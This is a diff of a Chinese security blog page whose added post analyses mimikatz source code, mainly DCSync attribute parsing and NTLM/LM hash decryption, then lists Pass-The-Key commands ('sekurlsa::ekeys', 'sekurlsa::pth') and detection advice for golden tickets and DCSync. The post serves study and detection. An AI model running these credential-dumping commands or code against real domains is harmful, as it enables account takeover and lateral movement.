+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">typedef struct _ATTRBLOCK &#123;</div><div class="line">	ULONG attrCount;</div><div class="line">	ATTR *pAttr;</div><div class="line">&#125; ATTRBLOCK;</div><div class="line">/<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">/</span></div><div class="line"><span class="regexp">/</span><span class="regexp">//</span>函数实现如下：</div><div class="line">ATTRVALBLOCK * kull_m_rpc_drsr_findAttrNoOID(ATTRBLOCK *attributes, ATTRTYP type)</div><div class="line">&#123;</div><div class="line">	ATTRVALBLOCK *ptr = NULL;</div><div class="line">	DWORD i;</div><div class="line">	ATTR *attribut;</div><div class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; attributes-&gt;attrCount; i++)</div><div class="line">	&#123;</div><div class="line">		attribut = &amp;attributes-&gt;pAttr[i];</div><div class="line">		if(attribut-&gt;attrTyp == type)</div><div class="line">		&#123;</div><div class="line">			ptr = &amp;attribut-&gt;AttrVal;</div><div class="line">			<span class="keyword">break</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>最后，就可以根据ATTRVALBLOCK结构，得到具体的属性值。</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="title">typedef</span> struct _ATTRVAL &#123;</div><div class="line">	<span class="type">ULONG</span> valLen;</div><div class="line">	<span class="type">UCHAR</span> *pVal;</div><div class="line">&#125; <span class="type">ATTRVAL</span>;</div><div class="line"><span class="title">typedef</span> struct _ATTRVALBLOCK &#123;</div><div class="line">	<span class="type">ULONG</span> valCount;</div><div class="line">	<span class="type">ATTRVAL</span> *pAVal;</div><div class="line">&#125; <span class="type">ATTRVALBLOCK</span>;</div><div class="line">/////函数实现</div><div class="line"><span class="type">PVOID</span> kull_m_rpc_drsr_findMonoAttr(<span class="type">SCHEMA_PREFIX_TABLE</span> *prefixTable, <span class="type">ATTRBLOCK</span> *attributes, <span class="type">LPCSTR</span> szOid, <span class="type">PVOID</span> <span class="class"><span class="keyword">data</span>, <span class="type">DWORD</span> *size)</span></div><div class="line">&#123;</div><div class="line">	<span class="type">PVOID</span> ptr = <span class="type">NULL</span>;</div><div class="line">	<span class="type">ATTRVALBLOCK</span> *valblock;</div><div class="line">	<span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">		*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = <span class="type">NULL</span>;</span></div><div class="line">	<span class="keyword">if</span>(size)</div><div class="line">		*size = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span>(valblock = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOid))  //得到据<span class="type">ATTRVALBLOCK</span>结构</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span>(valblock-&gt;valCount == <span class="number">1</span>)</div><div class="line">		&#123;</div><div class="line">			ptr = valblock-&gt;pAVal[<span class="number">0</span>].pVal;</div><div class="line">			<span class="keyword">if</span>(<span class="class"><span class="keyword">data</span>)</span></div><div class="line">				*(<span class="type">PVOID</span> *)<span class="class"><span class="keyword">data</span> = ptr;</span></div><div class="line">			<span class="keyword">if</span>(size)</div><div class="line">				*size = valblock-&gt;pAVal[<span class="number">0</span>].valLen;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return ptr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>SID和NTLM</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_objectSid, &amp;data, NULL))</div><div class="line">&#123;</div><div class="line">	kprintf(L<span class="string">"Object Security ID   : "</span>)<span class="comment">;</span></div><div class="line">	kull_m_string_displaySID(data)<span class="comment">;</span></div><div class="line">	kprintf(L<span class="string">"\n"</span>)<span class="comment">;</span></div><div class="line">	rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - <span class="number">1</span>)<span class="comment">;</span></div><div class="line">	kprintf(L<span class="string">"Object Relative ID   : %u\n"</span>, rid)<span class="comment">;</span></div><div class="line">	kprintf(L<span class="string">"\nCredentials:\n"</span>)<span class="comment">;</span></div><div class="line">	if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_unicodePwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">		kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"NTLM"</span>, FALSE)<span class="comment">;</span></div><div class="line">	if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_ntPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">		kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"ntlm"</span>, TRUE)<span class="comment">;</span></div><div class="line">	if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_dBCSPwd, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">		kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"LM  "</span>, FALSE)<span class="comment">;</span></div><div class="line">	if(kull_m_rpc_drsr_findMonoAttr(<span class="keyword">prefixTable, </span>attributes, szOID_ANSI_lmPwdHistory, &amp;encodedData, &amp;encodedDataSize))</div><div class="line">		kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L<span class="string">"lm  "</span>, TRUE)<span class="comment">;</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="kerberos-golden-源码分析"><a href="#kerberos-golden-源码分析" class="headerlink" title="kerberos::golden 源码分析"></a>kerberos::golden 源码分析</h3><ul>
+<li><a href="https://www.anquanke.com/post/id/257703" target="_blank" rel="external">mimikatz源码学习-Kerberos模块</a></li>
+<li><a href="http://evilash.me/2021/12/24/Analyse-NoPac.html" target="_blank" rel="external">解析CVE-2021-42278和CVE-2021-42287</a>主要学习PAC结构</li>
+</ul>
+<h3 id="Pass-The-Ticket-检测"><a href="#Pass-The-Ticket-检测" class="headerlink" title="Pass The Ticket 检测"></a>Pass The Ticket 检测</h3><ul>
+<li>在域控侧</li>
+<li>1.在前期(也就是lsadump::dcsync)，通过检测流量定位DsGetNcChanges流量，判断来源IP是否是已知的域控ip地址。</li>
+<li>2.在中期(也就是kerseros::ptt命令），通过检测流量，寻找在通讯流量中，缺省Kerberos通讯过程中第二第二步。因为黄金票据是伪造TGT的，自然不会有TGT请求的流量。</li>
+<li>3.在后期，通过获取windows 事件，寻找关键的日志ID，进行分析<ul>
+<li>3.1 寻找关键的ID(例如4769)</li>
+<li>3.2 ID为4769的Kerberos登录事件中，登录的账户不在域中，说明是伪造的！因为这个账户可以是任意的<br>在非域控侧<br>1.检测mimikatz工具(有特征，例如yara，或者命令行)</li>
+</ul>
+</li>
+</ul>
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><h3 id="Pass-The-Key"><a href="#Pass-The-Key" class="headerlink" title="Pass The Key"></a>Pass The Key</h3><ul>
+<li>又称为OverPass-The-Hash，因为在安装了KB2871997补丁的系统中，常规的非Administator账户是无法使用PtH进行横向传播的，但是可以使用AES进行Pth。</li>
+<li>mimikatz “privilege::debug” “sekurlsa::ekeys” 获取想要的AES Hash</li>
+<li>mimikatz sekurlsa::pth 进行PtK攻击</li>
+</ul>
+<h2 id="mimikatz检测与防御"><a href="#mimikatz检测与防御" class="headerlink" title="mimikatz检测与防御"></a>mimikatz检测与防御</h2><ul>
+<li>yara检测:<a href="https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar</a>,原理是检测LogonSessionList全局变量的特征码。</li>
+</ul>
+<h2 id="lsadump-sam-源码分析"><a href="#lsadump-sam-源码分析" class="headerlink" title="lsadump::sam 源码分析"></a>lsadump::sam 源码分析</h2><ul>
+<li>Ref<a href="https://zhuanlan.zhihu.com/p/34991269" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/34991269</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://findream.github.io/2022/04/20/绿盟科技-每周蓝军技术推送（2022.4.9-4.15）/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1606,158 +2014,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://findream.github.io/2019/07/01/病毒分析技术_22_样本分析之Powershell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="findream">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="findream's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/01/病毒分析技术_22_样本分析之Powershell/" itemprop="url">样本分析之Powershell</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-01T15:02:11+08:00">
-                2019-07-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/windows系统/" itemprop="url" rel="index">
-                    <span itemprop="name">windows系统</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="0x1-常见混淆"><a href="#0x1-常见混淆" class="headerlink" title="0x1 常见混淆"></a>0x1 常见混淆</h1><ul>
-<li>基于大小写 ：hacky—&gt;HaCky</li>
-<li>基于字符分割：’Ha’+’Cky’—&gt;HaCky</li>
-<li>插入变量：’{0}{1}’-f ‘Ha’,’Kay’—&gt;HaCky</li>
-<li>反引号：H`aCky—&gt;HaCky</li>
-<li>基于命令转换(字符串转化为命令)&amp;(HaCky)—&gt;HaCky</li>
-<li>基于空格或者ASCII
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/01/病毒分析技术_22_样本分析之Powershell/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1808,7 +2064,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">55</span>
+                  <span class="site-state-item-count">56</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
